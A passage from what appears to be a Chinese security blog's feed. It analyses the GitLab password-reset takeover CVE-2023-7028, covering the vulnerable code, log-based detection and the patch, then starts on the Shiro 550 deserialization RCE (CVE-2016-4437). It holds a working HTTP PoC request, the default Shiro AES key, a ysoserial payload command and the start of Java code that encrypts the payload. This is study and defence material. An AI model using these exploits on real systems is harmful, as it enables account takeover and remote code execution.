&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> recoverable &lt;span style="color:#f92672">=&lt;/span> by_email_with_errors(email)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> recoverable&lt;span style="color:#f92672">.&lt;/span>send_reset_password_instructions(&lt;span style="color:#e6db74">to&lt;/span>: email) &lt;span style="color:#66d9ef">if&lt;/span> recoverable&lt;span style="color:#f92672">&amp;amp;.&lt;/span>persisted?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> recoverable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">by_email_with_errors&lt;/span>(email)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> record &lt;span style="color:#f92672">=&lt;/span> find_by_any_email(email, &lt;span style="color:#e6db74">confirmed&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> record&lt;span style="color:#f92672">.&lt;/span>errors&lt;span style="color:#f92672">.&lt;/span>add(&lt;span style="color:#e6db74">:email&lt;/span>, &lt;span style="color:#e6db74">:invalid&lt;/span>) &lt;span style="color:#66d9ef">unless&lt;/span> record&lt;span style="color:#f92672">.&lt;/span>persisted?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> record
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send_reset_password_instructions&lt;/span>(opts &lt;span style="color:#f92672">=&lt;/span> {})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> token &lt;span style="color:#f92672">=&lt;/span> set_reset_password_token
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_reset_password_instructions_notification(token, opts)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> token
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send_reset_password_instructions_notification&lt;/span>(token, opts &lt;span style="color:#f92672">=&lt;/span> {})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_devise_notification(&lt;span style="color:#e6db74">:reset_password_instructions&lt;/span>, token, opts)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>让AI解释代码
Q:attributes.delete 是什么作用&lt;/p>
&lt;p>A:&lt;code>attributes.delete&lt;/code> 是 Ruby 中 Hash 类的一个方法。它的作用是从哈希中删除指定的键并返回其值。如果哈希中不存在该键，那么它将返回 &lt;code>nil&lt;/code>。
例如，假设我们有一个如下的哈希：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>attributes &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#e6db74">email&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;test@example.com&amp;#39;&lt;/span>, name: &lt;span style="color:#e6db74">&amp;#39;Test&amp;#39;&lt;/span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们可以使用 &lt;code>delete&lt;/code> 方法删除 &lt;code>email&lt;/code> 键：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>email &lt;span style="color:#f92672">=&lt;/span> attributes&lt;span style="color:#f92672">.&lt;/span>delete(&lt;span style="color:#e6db74">:email&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在，&lt;code>email&lt;/code> 变量的值将是 &lt;code>'test@example.com'&lt;/code>，并且 &lt;code>attributes&lt;/code> 哈希将只包含 &lt;code>{ name: 'Test' }&lt;/code>。&lt;/p>
&lt;p>Q:&lt;code>如果是如下数据&amp;quot;email&amp;quot;: [&amp;quot;victim@gmail.com&amp;quot;,&amp;quot;attacker@gmail.com&amp;quot;]attributes.delete 会获取到什么&lt;/code>&lt;/p>
&lt;p>A:在你给出的这个例子中，&lt;code>attributes&lt;/code> 是一个哈希，其中 &amp;ldquo;email&amp;rdquo; 键的值是一个包含两个字符串的数组。如果你调用 &lt;code>attributes.delete(&amp;quot;email&amp;quot;)&lt;/code>，那么它将会删除 &amp;ldquo;email&amp;rdquo; 键并返回其值，即这个包含两个电子邮件地址的数组：&lt;code>[&amp;quot;victim@gmail.com&amp;quot;, &amp;quot;attacker@gmail.com&amp;quot;]&lt;/code>。&lt;/p>
&lt;p>借助AI，其实可以知道了send_reset_password_instructions方法从参数里面获取email对应的值，在恶意请求里面，其会获取到一个数组，包含两个邮件地址。&lt;/p>
&lt;p>&lt;em>另外其实注意到，payload里面是&lt;code>user[email][]&lt;/code>，正常请求是&lt;code>user[email]&lt;/code>，多了一对中括号，询问AI&lt;/em>&lt;/p>
&lt;p>Q:为什么要使用&lt;code>user[mail][]&lt;/code>的形式，正常请求是&lt;code>user[mail]&lt;/code>&lt;/p>
&lt;p>A:在 HTTP 请求中，使用 &lt;code>user[email][]&lt;/code> 的形式是为了表示 &lt;code>email&lt;/code> 是一个数组。这在你想要发送多个电子邮件地址时非常有用。&lt;/p>
&lt;p>例如，如果你想要发送两个电子邮件地址，你可以这样构造你的 POST 请求的 body：&lt;/p>
&lt;pre tabindex="0">&lt;code>user[email][]=xxx@gmail.com&amp;amp;user[email][]=aaa@gmail.com
&lt;/code>&lt;/pre>&lt;p>这将会被解析为一个名为 &amp;ldquo;user&amp;rdquo; 的哈希，其中包含一个名为 &amp;ldquo;email&amp;rdquo; 的键，其值是一个包含两个电子邮件地址的数组。&lt;/p>
&lt;p>如果你只使用 &lt;code>user[email]&lt;/code>，那么它将被解析为一个名为 &amp;ldquo;user&amp;rdquo; 的哈希，其中包含一个名为 &amp;ldquo;email&amp;rdquo; 的键，其值是一个字符串。如果你尝试发送多个电子邮件地址，只有最后一个会被保留。&lt;/p>
&lt;p>所以，如果你想要发送多个电子邮件地址，你应该使用 &lt;code>user[email][]&lt;/code> 的形式。&lt;/p>
&lt;p>通过以上分析，payload利用ruby特性，在HTTP请求中构造&lt;code>user[email]&lt;/code>数组，使得后端的email变量包含两个邮件地址，从而泄露受害者的密码重置链接。&lt;/p>
&lt;p>&lt;strong>入侵检测&lt;/strong>&lt;/p>
&lt;p>官方给了审计是否受到攻击的方法：&lt;/p>
&lt;p>审计日志&lt;code>/var/log/gitlab/gitlab-rails/production_json.log&lt;/code>是否有对 &lt;code>/users/password&lt;/code> 路径的 HTTP 请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;method&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;POST&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;path&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/users/password&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;format&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;html&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;controller&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;PasswordsController&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;action&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;create&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;status&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">302&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;location&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://192.168.32.128/users/sign_in&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;time&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;2024-01-13T09:01:29.874Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;params&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;authenticity_token&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;[FILTERED]&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;user&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;value&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;email&amp;#34;&lt;/span>: [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;victim@gmail.com&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;attacker@gmail.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">.....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>审计日志
&lt;a href="https://docs.gitlab.com/ee/administration/logs/#audit_jsonlog" target="_blank">gitlab-rails/audit_json.log&lt;/a>中对&lt;code>PasswordsController#create&lt;/code> 和 &lt;code>target_details&lt;/code> 的请求是否包含多个电子邮件地址的 JSON 数组的条目。&lt;/p>
&lt;h4 id="补丁分析">补丁分析&lt;/h4>
&lt;p>查看补丁可知其当&lt;code>attributes[:email]&lt;/code>存在时会通过&lt;code>Email.confirmed.find_by&lt;/code>判断是否是已确认的邮件地址否则会直接返回，只有确认过的才会通过send_reset_password_instructions发送邮件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># frozen_string_literal: true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Concern that overrides the Devise methods to allow reset password instructions&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># to be sent to any users&amp;#39; confirmed secondary emails.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># See https://github.com/heartcombo/devise/blob/main/lib/devise/models/recoverable.rb&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">module&lt;/span> RecoverableByAnyEmail
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">extend&lt;/span> &lt;span style="color:#66d9ef">ActiveSupport&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">Concern&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> class_methods &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send_reset_password_instructions&lt;/span>(attributes &lt;span style="color:#f92672">=&lt;/span> {})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">super&lt;/span> &lt;span style="color:#66d9ef">unless&lt;/span> attributes&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">:email&lt;/span>&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">Email&lt;/span>&lt;span style="color:#f92672">.&lt;/span>confirmed&lt;span style="color:#f92672">.&lt;/span>find_by(&lt;span style="color:#e6db74">email&lt;/span>: attributes&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">:email&lt;/span>&lt;span style="color:#f92672">].&lt;/span>to_s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">super&lt;/span> &lt;span style="color:#66d9ef">unless&lt;/span> email
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> recoverable &lt;span style="color:#f92672">=&lt;/span> email&lt;span style="color:#f92672">.&lt;/span>user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> recoverable&lt;span style="color:#f92672">.&lt;/span>send_reset_password_instructions(&lt;span style="color:#e6db74">to&lt;/span>: email&lt;span style="color:#f92672">.&lt;/span>email)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> recoverable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send_reset_password_instructions&lt;/span>(opts &lt;span style="color:#f92672">=&lt;/span> {})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> token &lt;span style="color:#f92672">=&lt;/span> set_reset_password_token
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_reset_password_instructions_notification(token, opts)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> token
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send_reset_password_instructions_notification&lt;/span>(token, opts &lt;span style="color:#f92672">=&lt;/span> {})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_devise_notification(&lt;span style="color:#e6db74">:reset_password_instructions&lt;/span>, token, opts)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/5.png" />&lt;/p>
&lt;p>&lt;strong>题外话&lt;/strong>&lt;/p>
&lt;p>在补丁里面Gitlab维护者说明了为什么要使得未验证的邮箱可以获取到重置密码的链接，是为了方便管理员获取到重置密码链接，从而修改密码，避免被恶意用户直接设置2FA。&lt;/p>
&lt;pre tabindex="0">&lt;code> # By default &amp;#39;devise&amp;#39; gem allows password reset by unconfirmed primary email.
# When user account with unconfirmed primary email that means it is unconfirmed.
#
# Password reset by unconfirmed primary email is very helpful from
# security perspective. Example:
# Malicious person creates user account on GitLab with someone&amp;#39;s email.
# If the email owner confirms the email for newly created account, the malicious person will be able
# to sign in into the account by password they provided during account signup.
# The malicious person could set up 2FA to the user account, after that
# te email owner would not able to get access to that user account even
# after performing password reset.
# To deal with that case safely the email owner should reset password
# for the user account first. That will make sure that after the user account
# is confirmed the malicious person is not be able to sign in with
# the password they provided during the account signup. Then email owner
# could sign into the account, they will see a prompt to confirm the account email
# to proceed. They can safely confirm the email and take over the account.
# That is one of the reasons why password reset by unconfirmed primary email should be allowed.
&lt;/code>&lt;/pre>&lt;p>&lt;strong>复现截图&lt;/strong>&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/1.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/2.png" />&lt;/p>
&lt;p>PoC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /users/password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.59.211&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Language&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.59.211/users/password/new&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">147&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Origin&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.59.211&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Upgrade-Insecure-Requests&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>authenticity_token=f5QX5M91ZRP8-AfaC9G0xBLeOJflvQnB1G7-hZcbtd02t1-TXduqcTgC3dDfWyVqX7ik_aXAcq3fgK02gN01bg&amp;amp;user%5Bemail%5D%5B%5D=xxx@gmail.com&amp;amp;user%5Bemail%5D%5B%5D=aaa@gmail.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞利用了内在的处理逻辑，代码本意是从请求中获取到邮件地址(包括未确认的地址)，而后发送邮件，漏洞通过POST请求使得ruby获取到了邮件地址数组，第一个邮件地址是有效地址，所以可以通过by_email_with_errors判断。&lt;/p>
&lt;p>而后传给后续的处理逻辑，在邮件中也可以看到其重置密码邮件是同时发给受害者和攻击者邮箱。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/" target="_blank">https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2024-01-13T02:11:06+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2016-4437 Shiro 550 RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/</link><pubDate>Mon, 08 Jan 2024 18:08:35 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Shiro提供了记住我（RememberMe）的功能，比如访问如淘宝等一些网站时，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问，但是设计到一些支付等敏感操作时，可能还需要再次验证。而shiro默认使用了CookieRememberMeManager接口，就是rememberme功能,。其处理cookie的流程是: 得到rememberMe的cookie值，先进行Base64解码，再进行AES解密，最后进行反序列化。但是shiro本身有一个预设密钥&lt;code>Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)&lt;/code>，漏洞的突破口也是这点，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>Apache Shiro &amp;lt;= 1.2.4&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>服务器：vulhub&lt;/p>
&lt;p>客户端：添加org.apache.shiro依赖&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>使用ysoserial生成序列化payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cmd" data-lang="cmd">&lt;span style="display:flex;">&lt;span>java.exe -jar .\ysoserial-all.jar CommonsBeanutils1 &lt;span style="color:#e6db74">&amp;#34;touch /tmp/success&amp;#34;&lt;/span> &amp;gt; poc.ser
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用如下代码使用默认密钥加密生成的序列化数据&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> org.chestnut;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.shiro.crypto.AesCipherService;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.shiro.codec.CodecSupport;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.shiro.util.ByteSource;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.shiro.codec.Base64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.shiro.io.DefaultSerializer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.IOException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.nio.file.FileSystems;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.nio.file.Files;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.nio.file.Paths;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Main&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> IOException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> payloads &lt;span style="color:#f92672">=&lt;/span> Files.&lt;span style="color:#a6e22e">readAllBytes&lt;/span>(FileSystems.&lt;span style="color:#a6e22e">getDefault&lt;/span>().&lt;span style="color:#a6e22e">getPath&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;poc.ser&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AesCipherService aes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AesCipherService();
